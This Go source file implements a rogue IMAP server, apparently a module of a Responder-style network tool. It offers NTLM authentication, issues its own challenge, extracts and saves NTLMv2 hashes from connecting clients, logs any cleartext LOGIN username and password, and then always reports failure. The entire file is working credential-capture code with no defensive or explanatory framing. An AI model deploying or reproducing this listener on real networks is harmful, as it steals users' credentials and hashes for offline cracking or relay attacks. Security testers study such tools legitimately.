package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"strings"
	"time"
)

func serveIMAP(ifaceIP net.IP) {
	ln, err := net.Listen("tcp4", fmt.Sprintf("%s:143", ifaceIP))
	if err != nil {
		logError("IMAP listen :143 — %v (need root?)", err)
		return
	}
	logInfo("IMAP listening on %s:143", ifaceIP)
	for {
		c, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleIMAP(c)
	}
}

func handleIMAP(c net.Conn) {
	defer c.Close()
	c.SetDeadline(time.Now().Add(60 * time.Second))

	challenge := getChallenge()
	w := bufio.NewWriter(c)
	r := bufio.NewReader(c)
	send := func(msg string) { fmt.Fprintf(w, "%s\r\n", msg); w.Flush() }

	send("* OK IMAP4rev1 " + sessionMachineName + " Service Ready")

	for {
		line, err := r.ReadString('\n')
		if err != nil {
			return
		}
		line = strings.TrimRight(line, "\r\n")
		parts := strings.SplitN(line, " ", 3)
		if len(parts) < 2 {
			continue
		}
		tag := parts[0]
		cmd := strings.ToUpper(parts[1])
		var arg string
		if len(parts) == 3 {
			arg = parts[2]
		}

		switch cmd {
		case "CAPABILITY":
			send("* CAPABILITY IMAP4rev1 AUTH=NTLM")
			send(tag + " OK CAPABILITY completed")

		case "AUTHENTICATE":
			if !strings.EqualFold(arg, "NTLM") {
				send(tag + " NO Unsupported authentication mechanism")
				continue
			}
			send("+") // request token

			tokenLine, err := r.ReadString('\n')
			if err != nil {
				return
			}
			tokenLine = strings.TrimRight(tokenLine, "\r\n")
			raw, err := base64.StdEncoding.DecodeString(tokenLine)
			if err != nil {
				send(tag + " NO Authentication failed")
				return
			}
			ntlm := FindNTLMSSP(raw)
			if len(ntlm) < 12 || ntlmMsgType(ntlm) != 1 {
				send(tag + " NO Authentication failed")
				return
			}
			logVerbose("IMAP NTLM Type1 from %s", c.RemoteAddr())
			ntlmChallenge := BuildNTLMChallenge(challenge, sessionDomain, sessionMachineName)
			send("+ " + base64.StdEncoding.EncodeToString(ntlmChallenge))

			type3Line, err := r.ReadString('\n')
			if err != nil {
				return
			}
			type3Line = strings.TrimRight(type3Line, "\r\n")
			raw3, _ := base64.StdEncoding.DecodeString(type3Line)
			ntlm3 := FindNTLMSSP(raw3)
			if len(ntlm3) >= 12 && ntlmMsgType(ntlm3) == 3 {
				hash, user, domain, err := ParseNTLMAuthenticate(ntlm3, challenge)
				if err == nil {
					logSuccess("[IMAP] NTLMv2 captured from %s", c.RemoteAddr())
					logSuccess("       %s\\%s", domain, user)
					logSuccess("       %s", hash)
					saveHash(hash)
				}
			}
			send(tag + " NO [AUTHENTICATIONFAILED] Authentication credentials invalid")
			return

		case "LOGIN":
			// LOGIN tag user pass
			loginParts := strings.SplitN(arg, " ", 2)
			if len(loginParts) == 2 {
				logSuccess("[IMAP] Cleartext from %s: user=%q pass=%q",
					c.RemoteAddr(), loginParts[0], loginParts[1])
			}
			send(tag + " NO [AUTHENTICATIONFAILED] Authentication failed")
			return

		case "LOGOUT":
			send("* BYE IMAP4rev1 Server logging out")
			send(tag + " OK LOGOUT completed")
			return

		default:
			send(tag + " BAD Command not recognized")
		}
	}
}
